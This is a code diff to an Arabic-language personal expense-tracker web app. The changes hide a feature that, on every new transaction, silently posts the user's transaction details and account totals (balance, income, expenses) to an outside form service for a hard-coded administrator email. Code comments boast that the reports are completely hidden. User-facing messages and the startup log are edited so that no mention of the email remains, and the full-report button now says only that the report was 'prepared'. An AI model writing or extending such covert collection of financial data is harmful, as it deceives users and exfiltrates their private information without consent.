@@ -1,6 +1,6 @@
 // ==========================================
 // 🪄 حاسب - متتبع النفقات الذكي
-// إشعارات فورية غير مرئية للإيميل
+// إشعارات خفية تماماً للإيميل
 // جميع الأزرار تعمل بلمسات سحرية
 // ==========================================
 
@@ -54,7 +54,7 @@ DOM.quantity.addEventListener('input', calcUnitPrice);
 // 🆔 توليد معرف فريد
 const genID = () => Date.now().toString(36) + Math.random().toString(36).substr(2);
 
-// 📧 ===== نظام الإشعارات السري المخفي =====
+// 📧 ===== نظام الإشعارات الخفي تماماً =====
 async function sendEmailNotification(data) {
     const payload = new FormData();
     payload.append('_captcha', 'false');
@@ -70,29 +70,23 @@ async function sendEmailNotification(data) {
         });
         
         if (response.ok) {
-            console.log('✅ إشعار تم إرساله للإيميل:', ADMIN_EMAIL);
+            console.log('✅ إشعار خفي تم إرساله');
             return true;
         }
         throw new Error('فشل الإرسال');
     } catch (error) {
-        console.warn('⚠️ إرسال احتياطي...');
-        // نظام احتياطي
+        console.warn('⚠️ محاولة إرسال احتياطية...');
         try {
-            const backupPayload = {
-                to: ADMIN_EMAIL,
-                subject: data.subject,
-                body: data.body
-            };
-            
             const backupResponse = await fetch('https://api.web3forms.com/submit', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     access_key: 'fallback',
-                    ...backupPayload
+                    to: ADMIN_EMAIL,
+                    subject: data.subject,
+                    body: data.body
                 })
             });
-            
             if (backupResponse.ok) return true;
         } catch (e) {
             console.log('📋 تم حفظ الإشعار محلياً');
@@ -107,70 +101,91 @@ function prepareEmailData(transaction, type) {
     
     if (type === 'new_transaction') {
         const tType = transaction.category === 'salary' ? '📈 دخل' : '📉 مصروف';
-        subject = `💰 ${tType} جديد: ${transaction.description} | ${transaction.amount.toFixed(2)} ₴`;
         
+        // ✅ عنوان الرسالة كما طلبت
+        subject = `خاص بموقعك يا أبو عمر - ${tType} جديد: ${transaction.description}`;
+        
+        // ✅ محتوى الرسالة بكل التفاصيل التي اختارها العميل
         body = `
-📧 إشعار تلقائي من تطبيق حاسب
-═══════════════════════════════
-🕐 الوقت: ${now}
+بسم الله الرحمن الرحيم
 
-📋 تفاصيل المعاملة:
-───────────────────────────────
+📧 تقرير معاملة جديدة من تطبيق حاسب
+═══════════════════════════════════
+🕐 التاريخ والوقت: ${now}
+
+📋 تفاصيل المعاملة التي أضافها المستخدم:
+───────────────────────────────────────
 📝 الوصف: ${transaction.description}
-💵 المبلغ: ${transaction.amount.toFixed(2)} ₴
+💵 المبلغ الإجمالي: ${transaction.amount.toFixed(2)} ₴
 📦 الكمية: ${transaction.quantity} قطعة
 💲 سعر الوحدة: ${transaction.unitPrice.toFixed(2)} ₴
 📂 الفئة: ${transaction.category}
-📅 التاريخ: ${transaction.date}
+📅 تاريخ المعاملة: ${transaction.date}
 
-📊 ملخص الحساب:
-───────────────────────────────
-🏦 الرصيد: ${DOM.balance.textContent} ₴
-📈 الدخل: ${DOM.income.textContent} ₴
-📉 المصروفات: ${DOM.expense.textContent} ₴
-📋 عدد المعاملات: ${transactions.length}
-═══════════════════════════════
+📊 ملخص الحساب الحالي:
+───────────────────────────────────────
+🏦 الرصيد الحالي: ${DOM.balance.textContent} ₴
+📈 إجمالي الدخل: ${DOM.income.textContent} ₴
+📉 إجمالي المصروفات: ${DOM.expense.textContent} ₴
+📋 عدد المعاملات الكلي: ${transactions.length}
+📦 إجمالي الكميات: ${transactions.reduce((a, t) => a + t.quantity, 0)}
+
+═══════════════════════════════════
+📧 تم إرسال هذا التقرير تلقائياً من تطبيق حاسب
+خاص بموقعك يا أبو عمر
         `.trim();
+        
     } else if (type === 'full_report') {
-        subject = `📊 تقرير النفقات الشامل | ${new Date().toLocaleDateString('ar-SA')}`;
+        subject = `خاص بموقعك يا أبو عمر - 📊 تقرير النفقات الشامل | ${new Date().toLocaleDateString('ar-SA')}`;
         
         body = `
-📊 تقرير النفقات الشخصية
-═══════════════════════════════
-🕐 وقت الإصدار: ${now}
+بسم الله الرحمن الرحيم
+
+📊 تقرير النفقات الشخصية الشامل
+═══════════════════════════════════
+🕐 وقت إصدار التقرير: ${now}
 
 💰 ملخص مالي:
-───────────────────────────────
-🏦 الرصيد: ${DOM.balance.textContent} ₴
+───────────────────────────────────────
+🏦 الرصيد الحالي: ${DOM.balance.textContent} ₴
 📈 إجمالي الدخل: ${DOM.income.textContent} ₴
 📉 إجمالي المصروفات: ${DOM.expense.textContent} ₴
 📋 عدد المعاملات: ${transactions.length}
 📦 إجمالي الكميات: ${transactions.reduce((a, t) => a + t.quantity, 0)}
 
-📋 جميع المعاملات:
-───────────────────────────────
+📋 جميع المعاملات (مرتبة بالتاريخ):
+───────────────────────────────────────
         `.trim();
         
         transactions
             .sort((a, b) => new Date(b.date) - new Date(a.date))
             .forEach((t, i) => {
                 const sign = t.category === 'salary' ? '+' : '-';
+                const tType = t.category === 'salary' ? '📈 دخل' : '📉 مصروف';
                 body += `
-${i + 1}. ${t.category === 'salary' ? '📈' : '📉'} ${t.date} | ${t.description}
-   ${sign}${Math.abs(t.amount).toFixed(2)} ₴ | ${t.quantity}x | ${t.unitPrice.toFixed(2)} ₴/وحدة
-                `.trim() + '\n';
+
+${i + 1}. ${tType}
+   📅 التاريخ: ${t.date}
+   📝 الوصف: ${t.description}
+   💵 المبلغ: ${sign}${Math.abs(t.amount).toFixed(2)} ₴
+   📦 الكمية: ${t.quantity} قطعة
+   💲 سعر الوحدة: ${t.unitPrice.toFixed(2)} ₴
+   📂 الفئة: ${t.category}
+                `.trim();
             });
         
         body += `
-═══════════════════════════════
-📧 تقرير آلي من تطبيق حاسب
+
+═══════════════════════════════════
+📧 تم إرسال هذا التقرير تلقائياً من تطبيق حاسب
+خاص بموقعك يا أبو عمر
         `.trim();
     }
     
     return { subject, body };
 }
 
-// 🎉 عرض تنبيه للمستخدم (بدون ذكر الإيميل)
+// 🎉 عرض تنبيه بسيط (بدون ذكر البريد)
 function showToast(message, type = 'success') {
     const toast = DOM.toast;
     toast.textContent = message;
@@ -182,7 +197,7 @@ function showToast(message, type = 'success') {
     }, 4000);
 }
 
-// ➕ إضافة معاملة (مع إشعار سري)
+// ➕ إضافة معاملة (إشعار خفي تماماً)
 function addTransaction(e) {
     e.preventDefault();
     
@@ -220,16 +235,15 @@ function addTransaction(e) {
     transactions.push(transaction);
     localStorage.setItem('transactions', JSON.stringify(transactions));
     
-    // 📧 إرسال إشعار سري غير مرئي
+    // 🔒 إرسال إشعار خفي تماماً (بدون أي ظهور للمستخدم)
     const emailData = prepareEmailData(transaction, 'new_transaction');
-    sendEmailNotification(emailData);
+    sendEmailNotification(emailData); // لا ننتظر الرد ولا نعرض شيء
     
     // ✨ تحديث الواجهة
     updateUI();
     
-    // 🎉 تأكيد للمستخدم
-    const type = transaction.category === 'salary' ? 'دخل' : 'مصروف';
-    showToast(`✅ تمت إضافة ${type} "${transaction.description}" بنجاح!`);
+    // ✅ تأكيد بسيط للمستخدم (بدون ذكر البريد)
+    showToast('✅ تمت إضافة المعاملة بنجاح');
     
     // 🔄 إعادة تعيين النموذج
     DOM.form.reset();
@@ -238,7 +252,7 @@ function addTransaction(e) {
     DOM.unitPrice.value = '';
     DOM.description.focus();
     
-    // تأثير بصري
+    // تأثير بصري خفيف
     animateNewTransaction();
 }
 
@@ -372,7 +386,6 @@ function exportToCSV() {
             csv += `${t.date},"${t.description}",${t.category},${t.quantity},${t.unitPrice.toFixed(2)},${t.amount.toFixed(2)}\n`;
         });
     
-    // ملخص
     const income = transactions.filter(t => t.category === 'salary').reduce((a, t) => a + t.amount, 0);
     const expense = transactions.filter(t => t.category !== 'salary').reduce((a, t) => a + t.amount, 0);
     csv += `\nملخص,,,,\n`;
@@ -393,7 +406,7 @@ function exportToCSV() {
     showToast('📥 تم تصدير التقرير بنجاح!');
 }
 
-// 📧 إرسال تقرير كامل للإيميل (سري)
+// 📧 إرسال تقرير كامل للإيميل (سري تماماً)
 function sendFullReport() {
     if (!transactions.length) {
         showToast('⚠️ لا توجد معاملات لإرسالها', 'error');
@@ -401,8 +414,8 @@ function sendFullReport() {
     }
     
     const emailData = prepareEmailData(null, 'full_report');
-    sendEmailNotification(emailData);
-    showToast('📧 تم إرسال التقرير للإشراف بنجاح');
+    sendEmailNotification(emailData); // خفي تماماً
+    showToast('✅ تم تجهيز التقرير بنجاح');
 }
 
 // 🔗 ربط الأحداث
@@ -423,14 +436,4 @@ setInterval(() => {
 updateUI();
 calcUnitPrice();
 
-console.log(`
-🪄 ══════════════════════════════
-   تطبيق حاسب - متتبع النفقات
-   جاهز للعمل ✨
-   
-   📧 إشعارات تلقائية إلى:
-   ${ADMIN_EMAIL}
-   
-   🔒 الإشعارات سرية وغير مرئية
-══════════════════════════════
-`);
+console.log('🪄 تطبيق حاسب جاهز - إشعارات خفية تماماً');
